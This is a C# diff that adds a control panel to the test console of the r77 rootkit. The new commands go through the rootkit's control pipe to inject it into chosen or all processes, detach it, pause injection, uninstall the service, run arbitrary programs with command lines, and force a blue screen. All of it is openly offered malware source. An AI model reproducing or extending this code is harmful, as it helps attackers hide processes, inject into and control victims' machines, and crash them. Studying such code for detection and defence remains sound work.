@@ -5,6 +5,7 @@ using BytecodeApi.IO.Http;
 using BytecodeApi.Threading;
 using BytecodeApi.UI;
 using BytecodeApi.UI.Data;
+using BytecodeApi.UI.Dialogs;
 using Global;
 using System;
 using System.Collections.ObjectModel;
@@ -28,6 +29,7 @@ namespace TestConsole
 		private DelegateCommand<ProcessView> _UnhideCommand;
 		private DelegateCommand _InjectAllCommand;
 		private DelegateCommand _DetachAllCommand;
+		private DelegateCommand<ControlCode> _ControlCommand;
 		private DelegateCommand<string> _HelpCommand;
 		public DelegateCommand ElevateCommand => _ElevateCommand ?? (_ElevateCommand = new DelegateCommand(ElevateCommand_Execute, ElevateCommand_CanExecute));
 		public DelegateCommand<string> RunCommand => _RunCommand ?? (_RunCommand = new DelegateCommand<string>(RunCommand_Execute));
@@ -37,6 +39,7 @@ namespace TestConsole
 		public DelegateCommand<ProcessView> UnhideCommand => _UnhideCommand ?? (_UnhideCommand = new DelegateCommand<ProcessView>(UnhideCommand_Execute));
 		public DelegateCommand InjectAllCommand => _InjectAllCommand ?? (_InjectAllCommand = new DelegateCommand(InjectAllCommand_Execute));
 		public DelegateCommand DetachAllCommand => _DetachAllCommand ?? (_DetachAllCommand = new DelegateCommand(DetachAllCommand_Execute));
+		public DelegateCommand<ControlCode> ControlCommand => _ControlCommand ?? (_ControlCommand = new DelegateCommand<ControlCode>(ControlCommand_Execute));
 		public DelegateCommand<string> HelpCommand => _HelpCommand ?? (_HelpCommand = new DelegateCommand<string>(HelpCommand_Execute));
 
 		private bool UpdateProcessesNow;
@@ -44,6 +47,10 @@ namespace TestConsole
 		private ObservableCollection<ProcessView> _Processes;
 		private ProcessView _SelectedProcess;
 		private bool _IsAboutVisible;
+		private string _ControlCodeInjectProcessId;
+		private string _ControlCodeDetachProcessId;
+		private string _ControlCodeShellExecPath;
+		private string _ControlCodeShellExecCommandLine;
 		public bool IsInitialized
 		{
 			get => _IsInitialized;
@@ -52,17 +59,42 @@ namespace TestConsole
 		public ObservableCollection<ProcessView> Processes
 		{
 			get => _Processes;
-			set => Set(ref _Processes, value);
+			set
+			{
+				Set(ref _Processes, value);
+				RaisePropertyChanged(nameof(IsR77ServiceRunning));
+			}
 		}
 		public ProcessView SelectedProcess
 		{
 			get => _SelectedProcess;
 			set => Set(ref _SelectedProcess, value);
 		}
+		public bool IsR77ServiceRunning => Processes.Count(process => process.IsR77Service || process.Name == "dllhost.exe" && process.IsHiddenById) >= (Environment.Is64BitOperatingSystem ? 2 : 1);
 		public bool IsAboutVisible
 		{
 			get => _IsAboutVisible;
 			set => Set(ref _IsAboutVisible, value);
+		}
+		public string ControlCodeInjectProcessId
+		{
+			get => _ControlCodeInjectProcessId;
+			set => Set(ref _ControlCodeInjectProcessId, value);
+		}
+		public string ControlCodeDetachProcessId
+		{
+			get => _ControlCodeDetachProcessId;
+			set => Set(ref _ControlCodeDetachProcessId, value);
+		}
+		public string ControlCodeShellExecPath
+		{
+			get => _ControlCodeShellExecPath;
+			set => Set(ref _ControlCodeShellExecPath, value);
+		}
+		public string ControlCodeShellExecCommandLine
+		{
+			get => _ControlCodeShellExecCommandLine;
+			set => Set(ref _ControlCodeShellExecCommandLine, value);
 		}
 
 		public MainWindowViewModel(MainWindow view)
@@ -195,6 +227,133 @@ namespace TestConsole
 		{
 			Log(ProcessList.DetachAll().ToArray());
 			UpdateProcesses();
+		}
+		private void ControlCommand_Execute(ControlCode parameter)
+		{
+			try
+			{
+				switch (parameter)
+				{
+					case ControlCode.R77TerminateService:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.R77Uninstall:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.R77PauseInjection:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.R77ResumeInjection:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.ProcessesInject:
+						{
+							if (ControlCodeInjectProcessId.IsNullOrWhiteSpace())
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Specify a process ID.")
+								));
+							}
+							else if (ControlCodeInjectProcessId.ToInt32OrNull() is int processId)
+							{
+								Log(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), ControlCodeInjectProcessId).ToArray());
+							}
+							else
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Invalid process ID:"),
+									new LogDetailsItem(ControlCodeInjectProcessId)
+								));
+							}
+						}
+						break;
+					case ControlCode.ProcessesInjectAll:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.ProcessesDetach:
+						{
+							if (ControlCodeDetachProcessId.IsNullOrWhiteSpace())
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Specify a process ID.")
+								));
+							}
+							else if (ControlCodeDetachProcessId.ToInt32OrNull() is int processId)
+							{
+								Log(ControlPipe.Write(parameter, BitConverter.GetBytes(processId), ControlCodeDetachProcessId).ToArray());
+							}
+							else
+							{
+								Log(new LogMessage
+								(
+									LogMessageType.Error,
+									new LogFileItem(parameter.GetDescription()),
+									new LogTextItem("Invalid process ID:"),
+									new LogDetailsItem(ControlCodeDetachProcessId)
+								));
+							}
+						}
+						break;
+					case ControlCode.ProcessesDetachAll:
+						Log(ControlPipe.Write(parameter).ToArray());
+						break;
+					case ControlCode.UserShellExec:
+						ControlCodeShellExecPath = ControlCodeShellExecPath?.Trim().ToNullIfEmpty();
+						ControlCodeShellExecCommandLine = ControlCodeShellExecCommandLine?.Trim().ToNullIfEmpty();
+
+						if (ControlCodeShellExecPath == null)
+						{
+							Log(new LogMessage
+							(
+								LogMessageType.Error,
+								new LogFileItem(parameter.GetDescription()),
+								new LogTextItem("Specify a path.")
+							));
+						}
+						else
+						{
+							using (MemoryStream memoryStream = new MemoryStream())
+							{
+								using (BinaryWriter writer = new BinaryWriter(memoryStream))
+								{
+									writer.Write(ControlCodeShellExecPath.ToUnicodeBytes());
+									writer.Write((short)0);
+									if (ControlCodeShellExecCommandLine != null) writer.Write(ControlCodeShellExecCommandLine.ToUnicodeBytes());
+									writer.Write((short)0);
+								}
+
+								Log(ControlPipe.Write(parameter, memoryStream.ToArray(), ControlCodeShellExecPath + (ControlCodeShellExecCommandLine == null ? null : " " + ControlCodeShellExecCommandLine)).ToArray());
+							}
+						}
+						break;
+					case ControlCode.SystemBsod:
+						if (MessageBoxes.Confirmation("WARNING: This will trigger a blue screen.\r\nContinue?", true) == true)
+						{
+							Log(ControlPipe.Write(parameter).ToArray());
+						}
+						break;
+					default:
+						throw new ArgumentException();
+				}
+			}
+			catch (Exception ex)
+			{
+				Log(new LogMessage
+				(
+					LogMessageType.Error,
+					new LogTextItem("Sending command to control pipe failed."),
+					new LogDetailsItem("Error Details: " + ex.Message)
+				));
+			}
 		}
 		private void HelpCommand_Execute(string parameter)
 		{
